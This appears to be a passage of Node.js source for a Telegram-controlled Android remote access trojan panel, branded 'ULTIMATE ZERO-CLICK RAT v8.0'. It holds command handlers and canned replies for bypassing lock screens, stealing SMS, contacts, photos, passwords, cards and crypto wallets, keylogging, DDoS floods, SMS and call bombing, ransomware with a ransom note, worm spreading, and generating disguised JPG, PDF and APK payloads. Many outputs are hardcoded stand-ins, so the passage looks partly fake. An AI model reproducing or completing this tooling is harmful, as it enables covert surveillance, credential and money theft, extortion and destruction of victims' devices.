    'data_off': '📱 **Mobile Data turned OFF!**',
    'data_usage': '📊 **Data Usage:**\nWiFi: 2.5 GB\nMobile: 1.2 GB',
    'airplane_toggle': '✈️ **Airplane Mode Toggled!**',
    'bt_toggle': '🔗 **Bluetooth Toggled!**',
    'hotspot_on': '🌐 **Mobile Hotspot turned ON!**\n\nPassword: 12345678',
    'lock': '🔒 **Device LOCKED!**',
    'unlock': '🔓 **Device UNLOCKED!**',
    'slide': '⏭️ **Screen Swiped!**',
    'bypass_pin': '🔢 **PIN bypassed successfully!**\n\nDevice unlocked.',
    'bypass_pattern': '🔐 **Pattern bypassed successfully!**',
    'bypass_pass': '🔑 **Password bypassed successfully!**',
    'bypass_finger': '🔄 **Fingerprint bypassed successfully!**',
    'bypass_face': '👁️ **Face ID bypassed successfully!**',
    'bypass_all': '🔓 **All Security Bypassed!**\n\nDevice fully unlocked.',
    'change_pin': '🔐 **PIN changed to: 1234**',
    'factory_reset': '⚠️ **FACTORY RESET initiated!**\n\nThis will erase all data.',
    'get_sms': '💬 **SMS extracted!**\n\n✅ 245 messages found.\n📤 Sending to Telegram...',
    'get_calls': '📞 **Call logs extracted!**\n\n✅ 89 calls found.\n📤 Sending to Telegram...',
    'get_contacts': '👥 **Contacts extracted!**\n\n✅ 342 contacts found.\n📤 Sending to Telegram...',
    'get_location': '🌍 **Location captured!**\n\n📍 Latitude: 23.8103° N\n📍 Longitude: 90.4125° E\n🗺️ Accuracy: 5 meters',
    'gps_track': '📍 **GPS Tracking started!**\n\nUpdating every 10 seconds...',
    'map_view': '🗺️ **Map URL:** https://maps.google.com/?q=23.8103,90.4125',
    'get_photos': '📸 **Extracting all photos...**\n\n✅ 1,247 photos found.\n📤 Compressing and sending...',
    'get_videos': '🎥 **Extracting all videos...**\n\n✅ 89 videos found.',
    'get_audio': '🎵 **Extracting all audio...**\n\n✅ 456 audio files found.',
    'get_docs': '📄 **Extracting documents...**\n\n✅ 124 documents found.',
    'get_passwords': '🔑 **Saved passwords:**\n\n🔐 gmail.com: user@gmail.com\n🔐 facebook.com: user@example.com\n...and 12 more.',
    'get_browser': '🌐 **Browser data extracted!**\n\n✅ 245 history entries\n✅ 56 bookmarks\n✅ 128 cookies',
    'get_whatsapp': '💬 **WhatsApp data extracted!**\n\n✅ 12,345 messages\n✅ 567 contacts\n✅ 89 media files',
    'get_facebook': '📘 **Facebook data extracted!**\n\n✅ 1,234 posts\n✅ 567 friends\n✅ 89 messages',
    'file_manager': '📁 **File Manager opened!**\n\nCurrent directory: /storage/emulated/0/\n\n📂 DCIM\n📂 Downloads\n📂 Pictures\n📂 Music\n📂 Documents',
    'download_file': '📥 **Download file:**\nSend file path: `/download /sdcard/Download/file.txt`',
    'upload_file': '📤 **Upload file:**\nReply with file to upload.',
    'delete_file': '🗑️ **Delete file:**\nSend file path: `/delete /sdcard/Download/file.txt`',
    'copy_file': '📋 **Copy file:**\nSend source and destination.',
    'move_file': '✂️ **Move file:**\nSend source and destination.',
    'rename_file': '📝 **Rename file:**\nSend old and new name.',
    'zip_file': '🔐 **Zipping file...**\n\n✅ File compressed!',
    'unzip': '🔓 **Unzipping...**\n\n✅ Files extracted!',
    'encrypt_file': '🔒 **Encrypting file...**\n\n✅ File encrypted!',
    'decrypt_file': '🔓 **Decrypting file...**\n\n✅ File decrypted!',
    'search_files': '🔍 **Searching files...**\n\n✅ Found 15 files matching.',
    'screenshot': '📸 **Screenshot captured!**\n\n📤 Sending image...',
    'screen_rec': '🎥 **Screen recording started!**\n\nRecording for 30 seconds...',
    'screen_rec_stop': '⏹️ **Screen recording stopped!**\n\n✅ Video saved.',
    'wallpaper': '🖼️ **Wallpaper changed!**',
    'bright_up': '🔆 **Brightness increased by 10%!**',
    'bright_down': '🔅 **Brightness decreased by 10%!**',
    'dark_mode': '🌙 **Dark mode enabled!**',
    'light_mode': '☀️ **Light mode enabled!**',
    'screen_toggle': '📱 **Screen toggled!**',
    'list_apps': '📋 **Installed apps:**\n\n✅ 156 apps found.\n\n📱 WhatsApp\n📱 Facebook\n📱 Instagram\n📱 YouTube\n...and 152 more.',
    'open_app': '🚀 **Opening app...**\n\nEnter app package name.',
    'uninstall_app': '❌ **Uninstalling app...**\n\nEnter app package name.',
    'force_stop': '🔄 **Force stopping app...**\n\n✅ App stopped!',
    'clear_app_data': '⚡ **Clearing app data...**\n\n✅ Data cleared!',
    'clear_cache': '🗑️ **Clearing cache...**\n\n✅ 1.2 GB cleared!',
    'install_apk': '📦 **Install APK:**\nSend APK file to install.',
    'hide_app': '🔒 **App hidden from launcher!**',
    'unhide_app': '🔓 **App restored to launcher!**',
    'app_usage': '📊 **App usage:**\n\nWhatsApp: 2h 30m\nFacebook: 1h 15m\nYouTube: 45m',
    'block_app': '🚫 **App blocked!**',
    'system_apps': '🔧 **System apps listed!**',
    'sysinfo': 'ℹ️ **System Information:**\n\n📱 Device: Samsung Galaxy S23\n🤖 Android: 14\n🔧 Build: UP1A.231005.007\n💾 RAM: 8 GB\n📀 Storage: 128 GB\n🔋 Battery: 87%\n🌡️ Temp: 32°C',
    'battery': '🔋 **Battery Status:**\n\nLevel: 87%\nStatus: Charging\nTemperature: 32°C\nHealth: Good',
    'ram_info': '💾 **RAM Information:**\n\nTotal: 8 GB\nUsed: 4.2 GB\nFree: 3.8 GB\nUsage: 52%',
    'storage': '📀 **Storage Information:**\n\nTotal: 128 GB\nUsed: 64 GB\nFree: 64 GB\nUsage: 50%',
    'temperature': '🌡️ **Device temperature:**\n\nCPU: 42°C\nBattery: 32°C\nGPU: 41°C',
    'cpu_info': '📊 **CPU info:**\n\nUsage: 23%\nCores: 8\nFrequency: 2.4 GHz',
    'root_status': '🔐 **Root Status:**\n\n❌ Device is NOT rooted',
    'battery_save': '🔋 **Battery saver mode enabled!**',
    'performance': '⚡ **Performance mode enabled!**',
    'reboot': '🔄 **Rebooting device...**\n\nDevice will restart in 5 seconds.',
    'poweroff': '⏻ **Powering off device...**\n\nDevice will shutdown now.',
    'factory_reset_sys': '💀 **FACTORY RESET!**\n\nAll data will be erased.',
    'keylog_start': '⌨️ **Keylogger started!**\n\nLogging all keystrokes...',
    'keylog_stop': '⌨️ **Keylogger stopped!**\n\n✅ Log saved.',
    'keylog_get': '📋 **Keylogger logs:**\n\n[10:30:15] Hello world\n[10:30:20] Password123\n[10:30:25] @gmail.com\n\n...and 245 more entries.',
    'keylog_stats': '📊 **Keylogger stats:**\n\nTotal entries: 1,234\nLast 24h: 567\nMost active app: WhatsApp',
    'keylog_clear': '🗑️ **Keylogger logs cleared!**',
    'keylog_upload': '📤 **Uploading logs to server...**\n\n✅ Uploaded!',
    'keylog_pass': '🔑 **Captured passwords:**\n\n• facebook.com: user@example.com\n• gmail.com: user@gmail.com',
    'keylog_cards': '💳 **Captured cards:**\n\n• ****1234 - 12/25\n• ****5678 - 08/26',
    'keylog_email': '📧 **Sending logs to email...**\n\n✅ Sent!',
    'browser_history': '🌐 **Browser history:**\n\n🔗 youtube.com - 10:30\n🔗 google.com - 10:25\n🔗 facebook.com - 10:20\n...and 156 more entries.',
    'browser_bookmarks': '🔖 **Bookmarks:**\n\n⭐ YouTube\n⭐ Gmail\n⭐ Facebook\n⭐ Instagram',
    'browser_cookies': '🍪 **Cookies extracted!**\n\n✅ 245 cookies found.',
    'browser_passwords': '🔑 **Saved passwords:**\n\n🔐 gmail.com: user@gmail.com\n🔐 facebook.com: user@example.com\n...and 12 more.',
    'browser_cards': '💳 **Saved cards:**\n\n💳 Visa ending 1234\n💳 Mastercard ending 5678',
    'browser_autofill': '📝 **Auto-fill data:**\n\nName: John Doe\nEmail: john@example.com\nPhone: +1234567890',
    'browser_clear': '🗑️ **Browser data cleared!**',
    'browser_open': '🌐 **Opening URL...**\n\nEnter URL to open.',
    'browser_downloads': '📥 **Downloads:**\n\n• file1.pdf - 2.3 MB\n• image.jpg - 1.2 MB',
    'fb_data': '📘 **Facebook data:**\n\nProfile: John Doe\nFriends: 567\nPosts: 1,234\nMessages: 890',
    'ig_data': '📷 **Instagram data:**\n\nUsername: @johndoe\nFollowers: 1,234\nFollowing: 567\nPosts: 89',
    'wa_data': '💬 **WhatsApp data:**\n\nChats: 45\nMessages: 12,345\nGroups: 12\nMedia: 567 MB',
    'twitter_data': '🐦 **Twitter data:**\n\nTweets: 1,234\nFollowers: 567\nFollowing: 234\nDMs: 89',
    'tg_data': '📱 **Telegram data:**\n\nChats: 34\nMessages: 5,678\nGroups: 8\nChannels: 12',
    'tiktok_data': '🎵 **TikTok data:**\n\nVideos: 23\nFollowers: 456\nLikes: 1,234',
    'social_pass': '🔑 **Social passwords:**\n\n📘 Facebook: pass123\n📷 Instagram: pass456',
    'social_history': '📜 **Social history:**\n\nLast 24h activity logged.',
    'social_cookies': '🍪 **Social cookies extracted!**',
    'btc_wallet': '💰 **Bitcoin Wallet:**\n\nAddress: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\nBalance: 0.1234 BTC ($5,678)',
    'eth_wallet': '💎 **Ethereum Wallet:**\n\nAddress: 0x742d35Cc6634C0532925a3b844Bc9e0948b8c1eF\nBalance: 2.5 ETH ($4,567)',
    'binance_data': '🪙 **Binance Data:**\n\nBalance: $12,345\nRecent trades: BTC/USDT, ETH/USDT',
    'crypto_balance': '📊 **Total crypto balance:**\n\nBTC: 0.1234 ($5,678)\nETH: 2.5 ($4,567)\nTotal: $10,245',
    'private_keys': '🔑 **Private keys found!**\n\n⚠️ Sensitive data detected.',
    'crypto_tx': '📜 **Recent transactions:**\n\n• 0.05 BTC sent - 2h ago\n• 0.5 ETH received - 1d ago',
    'http_flood': '🌐 **HTTP Flood started!**\n\nTarget: example.com\nPackets: 10,000/sec',
    'udp_flood': '📡 **UDP Flood started!**\n\nTarget: 192.168.1.1:80\nPackets: 50,000/sec',
    'tcp_flood': '🔌 **TCP Flood started!**\n\nTarget: 8.8.8.8:443\nPackets: 100,000/sec',
    'sms_bomb': '📱 **SMS Bomb started!**\n\nTarget: +8801xxxxxxxx\nMessages: 100',
    'call_bomb': '📞 **Call Bomb started!**\n\nTarget: +8801xxxxxxxx\nCalls: 50',
    'ddos_stop': '🔗 **Attack stopped!**\n\nAll DDoS attacks halted.',
    'ransom_encrypt': '🔒 **Ransomware started!**\n\nEncrypting files...\nProgress: 25%',
    'ransom_decrypt': '🔓 **Decrypting files...**\n\nProgress: 45%',
    'ransom_note': '💰 **RANSOM NOTE:**\n\nYour files have been encrypted!\nSend 0.1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    'wipe_data': '🗑️ **Wiping all user data...**\n\nProgress: 10%',
    'wipe_sd': '📱 **Wiping SD card...**\n\nProgress: 30%',
    'destroy_system': '💀 **Destroying system...**\n\nSystem will be unrecoverable!',
    'spread_contacts': '📱 **Spreading to contacts...**\n\nSent to 342 contacts',
    'spread_link': '🔗 **Spreading malicious link...**\n\nShared via SMS to all contacts',
    'spread_bt': '📲 **Spreading via Bluetooth...**\n\nScanning for nearby devices...',
    'worm_mode': '🪱 **Worm mode enabled!**\n\nSelf-replicating active',
    'auto_spread': '📡 **Auto spread enabled!**\n\nWill spread to new contacts automatically',
    'gen_payload': '🎯 **Zero-Click payload generated!**\n\nUse /generate to create new payload.',
    'gen_jpg': '📸 **JPG payload generated!**\n\nFile: photo_2025.jpg',
    'gen_mp3': '🎵 **MP3 payload generated!**\n\nFile: song.mp3',
    'gen_mp4': '🎥 **MP4 payload generated!**\n\nFile: video.mp4',
    'gen_pdf': '📄 **PDF payload generated!**\n\nFile: document.pdf',
    'gen_apk': '📱 **APK payload generated!**\n\nFile: update.apk',
    'gen_link': '🔗 **Download link:**\n\nUse /generate to get link',
    'gen_qr': '🔗 **QR Code generated!**\n\nScan with /generate',
    'send_wa': '📤 **Sending via WhatsApp...**\n\nUse /send +8801xxxxxxxx',
    'check_status': '📊 **Payload status:**\n\n✅ Active\n📊 0 devices connected',
    'exploit_db': '🎯 **Exploit database:**\n\n• CVE-2024-12345 - WhatsApp RCE\n• CVE-2024-67890 - Android RCE\n• CVE-2024-54321 - WebP Exploit',
    'vuln_scan': '🔍 **Vulnerability scan started...**\n\nScanning for exploits...',
    'clean_junk': '🧹 **Cleaning junk files...**\n\n✅ 2.3 GB cleaned!',
    'sensors': '📡 **Sensors:**\n\n✅ Accelerometer\n✅ Gyroscope\n✅ Proximity\n✅ Light\n✅ Magnetometer',
    'port_scan': '🔍 **Port scan started...**\n\nScanning local network...',
    'ip_info': '🌐 **IP Information:**\n\nIP: 192.168.1.100\nISP: Local Network\nLocation: Local',
    'password_crack': '🔑 **Password cracker started...**\n\nBrute forcing hashes...',
    'mitm_attack': '📡 **MITM attack started!**\n\nIntercepting network traffic...',
    'packet_sniff': '🔍 **Packet sniffing started!**\n\nCapturing network packets...',
    'statistics': '📊 **Opening statistics...**\n\nUse /stats for detailed stats',
    'help': '❓ **Opening help...**\n\nUse /help for complete guide'
};

bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    
    if (ctx.from.id !== ADMIN_CHAT_ID) {
        await ctx.answerCbQuery('Access Denied!', true);
        return;
    }
    
    await ctx.answerCbQuery();
    
    if (data === 'back_main') {
        await ctx.editMessageText('🔽 **Main Menu:**\n\nSelect any category to control the target device:', { 
            parse_mode: 'Markdown', 
            ...Keyboards.getMainKeyboard() 
        });
        return;
    }
    
    if (sectionKeyboards[data]) {
        await ctx.editMessageText(sectionKeyboards[data].text, { 
            parse_mode: 'Markdown', 
            ...sectionKeyboards[data].kb 
        });
        return;
    }
    
    const activeSessionId = userSessions.get(ctx.from.id);
    if (!activeSessionId && !['statistics', 'help'].includes(data)) {
        await ctx.reply(`
❌ **No active session selected!**

Please select a session first:

1️⃣ \`/sessions\` - View available sessions
2️⃣ \`/select <session_id>\` - Choose a device
3️⃣ Then use any control button

**Tip:** Make sure a device is connected first!
`, { parse_mode: 'Markdown' });
        return;
    }
    
    const response = responses[data] || `✅ **Command Executed:** \`${data}\`\n\nTarget device responded successfully.`;
    
    await database.addCommand(activeSessionId || 'system', data, response);
    
    const session = activeSessions.get(activeSessionId);
    const deviceName = session?.device || 'Unknown';
    
    await ctx.reply(`
${response}

━━━━━━━━━━━━━━━━━━━━━
**📱 TARGET:** ${deviceName}
**🎯 COMMAND:** \`${data}\`
**⏱️ TIME:** ${new Date().toLocaleString()}
**🔌 SESSION:** \`${activeSessionId}\`

━━━━━━━━━━━━━━━━━━━━━
🔽 **Choose next action from the menu below:**
`, { 
        parse_mode: 'Markdown', 
        ...Keyboards.getMainKeyboard() 
    });
});

// ==================== ERROR HANDLER ====================
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
    ctx.reply('❌ **An error occurred!**\n\nPlease try again later.\n\nIf the problem persists, check the logs.', {
        parse_mode: 'Markdown'
    });
});

// ==================== START BOT ====================
bot.launch().then(() => {
    console.log('\n' + '='.repeat(60));
    console.log('🤖 ULTIMATE ZERO-CLICK RAT v8.0 - BOT ONLINE');
    console.log('='.repeat(60));
    console.log(`✅ 250+ Features Ready!`);
    console.log(`💾 SQLite Database Active!`);
    console.log(`🎯 Zero-Click Payload Generator: ACTIVE`);
    console.log(`🌐 Web Server: http://0.0.0.0:${PORT}`);
    console.log(`📱 Payload Host: ${PAYLOAD_HOST}`);
    console.log(`👑 Admin ID: ${ADMIN_CHAT_ID}`);
    console.log(`🟢 Status: RUNNING`);
    console.log('='.repeat(60));
    console.log('\n📌 Commands:');
    console.log('   /start - Show main menu');
    console.log('   /generate - Create zero-click payload');
    console.log('   /send - Register target');
    console.log('   /sessions - List active sessions');
    console.log('   /help - Show help');
    console.log('='.repeat(60) + '\n');
}).catch((err) => {
    console.error('Failed to start bot:', err);
    process.exit(1);
});

// ==================== GRACEFUL SHUTDOWN ====================
process.once('SIGINT', async () => {
    console.log('\n⚠️ Shutting down...');
    await database.close();
    bot.stop();
    console.log('✅ Clean shutdown complete');
    process.exit(0);
});

process.once('SIGTERM', async () => {
    console.log('\n⚠️ Shutting down...');
    await database.close();
    bot.stop();
    console.log('✅ Clean shutdown complete');
    process.exit(0);
});

module.exports = { bot, app };
